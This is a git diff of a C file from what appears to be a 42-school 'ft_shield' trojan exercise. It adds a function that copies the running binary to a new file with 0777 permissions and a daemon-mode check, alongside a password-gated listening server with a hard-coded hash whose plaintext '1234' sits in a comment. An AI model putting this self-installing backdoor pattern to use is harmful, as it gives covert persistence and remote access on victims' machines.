@@ -6,14 +6,11 @@
 /*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2025/11/16 18:15:16 by mbatty            #+#    #+#             */
-/*   Updated: 2025/11/21 11:18:14 by mbatty           ###   ########.fr       */
+/*   Updated: 2025/11/21 11:55:27 by mbatty           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
-#include "server.h"
-#include "sys/signal.h"
-#include <stdio.h>
-#include <fcntl.h>
+#include "ctx.h"
 
 int	g_sig = 0;
 
@@ -21,21 +18,6 @@ void	handle_sig(int sig)
 {
 	g_sig = sig;
 }
-
-# define TEXT_RED "\033[31m"
-# define TEXT_GREEN "\033[32m"
-# define TEXT_YELLOW "\033[33m"
-# define TEXT_BOLD "\033[1m"
-# define TEXT_RESET "\033[0m"
-# define PASSWORD_PROMPT_TEXT TEXT_YELLOW TEXT_BOLD "Please provide the password.\n" TEXT_RESET
-# define INCORRECT_PASSWORD_TEXT TEXT_RED TEXT_BOLD "Incorrect password!\n" TEXT_RESET
-# define CORRECT_PASSWORD_TEXT TEXT_GREEN TEXT_BOLD "Correct password, welcome in!\n" TEXT_RESET
-
-# define LOWERCASE_HEXA "0123456789abcdef"
-
-# define PASSWORD "3c72631c6e15250756383845e3987864" // 1234
-
-# include <openssl/evp.h>
 
 char	*sha256(const char *input)
 {
@@ -66,46 +48,6 @@ char	*sha256(const char *input)
 		res[i] = LOWERCASE_HEXA[hash[i] % 16];
 
 	return (res);
-}
-
-typedef struct s_ctx
-{
-	t_server	server;
-	int			log_fd;
-}	t_ctx;
-
-typedef enum e_log_type
-{
-	LOG_INFO,
-	LOG_LOG,
-	LOG_ERROR,
-	LOG_NONE,
-}	t_log_type;
-
-const char	*logger_get_log_header(t_log_type type)
-{
-	switch (type)
-	{
-		case LOG_INFO:
-			return ("[INFO] ");
-		case LOG_LOG:
-			return ("[LOG] ");
-		case LOG_ERROR:
-			return ("[ERROR] ");
-		default:
-			return ("[NONE] ");
-	}
-}
-
-void	logger_log(t_ctx *ctx, t_log_type type, char *str, ...)
-{
-	va_list	args;
-
-	va_start(args, str);
-	dprintf(ctx->log_fd, "%s", logger_get_log_header(type));
-	vdprintf(ctx->log_fd, str, args);
-	va_end(args);
-	dprintf(ctx->log_fd, "\n");
 }
 
 int	check_client_password(t_ctx *ctx, t_client *client, char *msg)
@@ -166,7 +108,7 @@ int	ctx_init(t_ctx *ctx)
 	logger_log(ctx, LOG_INFO, "Starting ft_shield");
 
 	logger_log(ctx, LOG_INFO, "Opening server");
-	if (!server_open(&ctx->server, 7002))
+	if (!server_open(&ctx->server, SERVER_PORT))
 	{
 		logger_log(ctx, LOG_ERROR, "Failed to open server");
 		close(ctx->log_fd);
@@ -198,13 +140,43 @@ int	ctx_loop(t_ctx *ctx)
 	return (1);
 }
 
-int	main(void)
+void	export_payload(char *src_path, char *dst_path)
+{
+	char 	buf[4096];
+	ssize_t rdb;
+	int		fdin;
+	int		fdout;
+
+	fdin = open(src_path, O_RDONLY);
+	fdout = open(dst_path, O_CREAT | O_WRONLY | O_TRUNC, 0777);
+
+	do
+	{
+		rdb = read(fdin, buf, sizeof(buf));
+		write(fdout, buf, rdb);
+	} while (rdb > 0);
+
+	close(fdin);
+	close(fdout);
+}
+
+int	main(int ac, char **av)
 {
 	t_ctx	ctx;
-
+	
+	(void)ac;
 	printf("mbatty\n");
+
+	export_payload(av[0], "binft_shield");
+	if (!strcmp("/bin/ft_shield", av[0]))
+	{
+		printf("Execute as daemon\n");
+	}
+	else
+		printf("Export payload!\n");
+
 	if (!ctx_init(&ctx))
-		return (1);
+		return (0);
 	ctx_loop(&ctx);
 	return (ctx_delete(&ctx));
 }
